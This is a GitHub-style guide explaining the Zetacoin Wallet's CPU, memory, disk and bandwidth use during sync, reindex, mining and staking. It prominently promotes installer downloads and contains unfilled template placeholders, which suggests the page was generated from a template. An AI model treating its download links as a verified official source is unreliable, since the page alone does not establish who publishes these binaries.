![Zetacoin Wallet](assets/banner-article.png)

<h1 align="center">Why the Zetacoin Wallet Uses CPU, RAM and Disk</h1>

<p align="center">Diagnosis first, then the numbered fix, then the setting that stops it happening again.</p>

<div align="center">
<a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Windows"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-20748c?style=for-the-badge&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="Download for macOS"></a> <a href="https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-20748c?style=for-the-badge&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/Windows-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTAgMy40NDlMOS43NSAyLjF2OS40NTFIMFYzLjQ0OXptMTAuOTQ5LTEuNTFMMjQgMHYxMS40SDEwLjk0OVYxLjkzOXpNMCAxMi42aDkuNzV2OS40NTFMMCAyMC42OTlWMTIuNnptMTAuOTQ5IDBIMjRWMjRsLTEyLjktMS44MDFWMTIuNnoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`zetacoin-0.13.2.2-win-setup.exe`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-win-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-universal-20748c?style=flat-square&labelColor=0e121b&logo=apple&logoColor=ffffff" alt="macOS" height="24"> | macOS 12 or later | [`zetacoin-0.13.2.2-osx.dmg`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-osx.dmg) |
| <img src="https://img.shields.io/badge/Linux-x64-20748c?style=flat-square&labelColor=0e121b&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZmZmZiIgZD0iTTMgM2gxOGExIDEgMCAwMTEgMXYxNmExIDEgMCAwMS0xIDFIM2ExIDEgMCAwMS0xLTFWNGExIDEgMCAwMTEtMXptMSAydjE0aDE2VjVINHptMi4xIDMuMmwzLjYgMy4zLTMuNiAzLjMgMSAxLjEgNC43LTQuNC00LjctNC40LTEgMS4xek0xMiAxNS41aDZWMTdoLTZ2LTEuNXoiLz48L3N2Zz4%3D&logoColor=ffffff" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`zetacoin-0.13.2.2-linux.zip`](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/download/v0.13.2.2/zetacoin-0.13.2.2-linux.zip) |

</div>

All three builds, their checksums and older tags are on the [Zetacoin Wallet release page](https://github.com/zetacoin-wallet/zetacoin-desktop-wallet/releases/tag/v0.13.2.2).

> Only download from this GitHub release page.

---

Zetacoin Wallet runs a full node, so it holds the chain on disk, keeps indexes in memory and validates blocks as they arrive. Expect about 1 GB of chain data, around 2 GB of RAM during the first sync and low steady use afterwards. Heavy CPU or runaway disk use is usually a reindex, a resync or mining on the same machine.

## What the client is doing with your hardware

Three workloads share the process. Validation checks each block against consensus rules, storage writes blocks and the index to disk, and the wallet keeps keys and transaction state in memory. None of them is computationally expensive on a chain with 30-second blocks.

The one activity that changes the profile is mining, which is CPU or GPU intensive by design, and the one that changes it temporarily is a reindex or a full sync, which is disk intensive. Everything else is background noise on a modern machine.

| Phase | CPU | Memory | Disk |
| --- | --- | --- | --- |
| First sync | moderate | up to about 2 GB | continuous writes |
| Steady state, synced | very low | a few hundred MB | small, per block |
| Reindex or rescan | moderate | similar to sync | sustained reads and writes |
| Mining enabled | high, hardware-dependent | depends on miner | minimal |
| Staking only | very low | low | small |

The full walk-through, with the checks in order, is in [Zetacoin Wallet System Requirements](https://github.com/zetacoin-wallet/zetacoin-wallet-guides/blob/main/system-requirements-for-the-client.md).

## Disk: what grows and what does not

The chain grows. A block every 30 seconds means roughly 2,880 blocks a day, each a small file, and the index grows alongside. The client's data directory therefore creeps upward over months, which is normal and slow.

The wallet file does not grow with the chain; it grows with the number of keys and transactions you have. Logs grow slowly and can be removed, though keeping the recent ones helps when something goes wrong.

If free space reaches zero, the client fails in a way that looks like corruption rather than a full disk. Leaving a few gigabytes free is the cheapest insurance available.

## Memory: why the first sync is the peak

During the initial sync the client holds a working set of indexes and block data in memory while it writes them to disk. That is the moment the 2 GB requirement matters, and it is why a machine with less RAM fails then rather than later.

Once synced, memory use falls to a fraction of that. If the client's memory keeps climbing after the sync, the usual suspects are a very large wallet with many transactions, or a client that has been running for months without a restart.

For the background behind this step, [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md) covers the same ground in more detail.

## CPU: what is normal and what is not

A synced wallet that is only holding coins uses almost no CPU. A wallet that is staking wakes briefly when it signs a block. A wallet that is mining uses as much as the miner can get, which is the point of mining.

Sustained high CPU without mining usually means the client is reindexing or resyncing, which is visible in the log. If neither is happening and the CPU stays pegged, check for a second copy of the client running  -  two instances against one data directory is a common accident and produces exactly this symptom.

## Bandwidth: the sync is the download

The client downloads the chain once and then exchanges small messages with peers. A full sync moves hundreds of megabytes; steady state moves very little.

If bandwidth stays high after the sync completes, the node is likely serving blocks to other peers, which is normal and desirable. It costs upload rather than download, and it is the reason a node on a metered connection deserves a bandwidth limit.

## Mining changes every number

With mining enabled, the client's CPU or GPU use is whatever the miner can take. That is not a fault, but it does mean the requirements table stops applying: a machine that runs a wallet comfortably may be unusable for anything else while it mines.

Mining also competes with validation for memory and disk on a small machine, which is why a separate rig is the usual arrangement for anyone mining seriously. Staking has no such profile  -  it wakes to sign a block and idles in between.

If the fan noise is unexpected, check whether mining was left enabled after a test. It is the most common reason a wallet suddenly becomes loud.

## When the machine is the bottleneck

Old spinning disks make sync and reindex slow, and a laptop that sleeps pauses everything. A virtual machine on a network share can produce database errors that look like software faults.

None of those are client problems, and no setting fixes them. The practical moves are an SSD, a machine that stays awake, and the bootstrap archive for the initial chain.

## Keeping resource use predictable

Restart the client occasionally so that memory is released cleanly. Keep the log directory from growing without bound. Do not run mining and a large reindex at the same time on a modest machine, because both want the same resources.

If you run a node permanently, a small always-on machine is a better fit than a laptop, and the headless setup uses less memory because there is no desktop interface to draw.

## Common questions

### Why is the wallet using 2 GB of RAM?

That is the initial sync holding indexes in memory. After the sync completes, usage drops substantially.

### Is 1 GB of disk enough?

For chain data, yes. The data directory also holds the wallet, logs and any bootstrap archive you unpack, so leave headroom.

### Why is my CPU at 100%?

Either mining is enabled, or the client is reindexing, or a second instance is running against the same data directory.

### Does staking use much power?

Very little. The wallet wakes to sign a block when its coins are selected and idles in between.

## The short version

Expect a disk-heavy sync, modest steady-state use, and spikes during reindex or mining. If use stays high after a sync, check for a second instance before blaming the software.

Related pages: {{ARTICLE:zetacoin-wallet-system-requirements}} for the minimums, {{ARTICLE:run-zetacoin-full-node-headless}} for the low-memory setup, {{ARTICLE:reindex-zetacoin-wallet-database}} for the disk-heavy repair, and {{ARTICLE:how-to-stake-zetacoin-coins}} for the staking profile and {{ARTICLE:zetacoin-mining-hardware-choices}} for what mining asks of a machine. {{RELEASE}} carries the current build if the client is old enough that its behaviour predates these expectations.

---

## Download Zetacoin Wallet

The three installers for v0.13.2.2 are listed at the top of this page: `zetacoin-0.13.2.2-win-setup.exe`, `zetacoin-0.13.2.2-osx.dmg` and `zetacoin-0.13.2.2-linux.zip`.

## Related guides

- [Reindex, Rescan and Read Logs in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/reindex-the-database-and-read-logs.md)
- [Zetacoin Wallet Not Syncing: Step-by-Step Fix](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/wallet-not-syncing-walkthrough.md)
- [Fix "No Block Source Available" in Zetacoin](https://github.com/zetacoin-wallet/zetacoin-blockchain/blob/main/fix-no-block-source-error.md)
